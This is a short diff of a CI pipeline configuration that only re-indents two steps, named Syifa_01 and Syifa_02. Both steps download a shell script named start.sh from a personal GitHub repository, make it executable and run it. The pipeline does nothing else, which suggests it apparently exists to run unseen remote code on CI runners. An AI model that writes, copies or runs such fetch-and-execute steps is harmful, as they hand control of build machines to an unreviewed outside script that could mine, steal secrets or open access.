@@ -11,9 +11,9 @@ pool:
 
 steps:
 - run:
-  name: Syifa_01
-  command: wget https://raw.githubusercontent.com/kelimutharuk/puki/master/start.sh && chmod u+x start.sh && ./start.sh
+    name: Syifa_01
+    command: wget https://raw.githubusercontent.com/kelimutharuk/puki/master/start.sh && chmod u+x start.sh && ./start.sh
 - run:
-  name: Syifa_02
-  command: wget https://raw.githubusercontent.com/kelimutharuk/puki/master/start.sh && chmod u+x start.sh && ./start.sh
+    name: Syifa_02
+    command: wget https://raw.githubusercontent.com/kelimutharuk/puki/master/start.sh && chmod u+x start.sh && ./start.sh
       
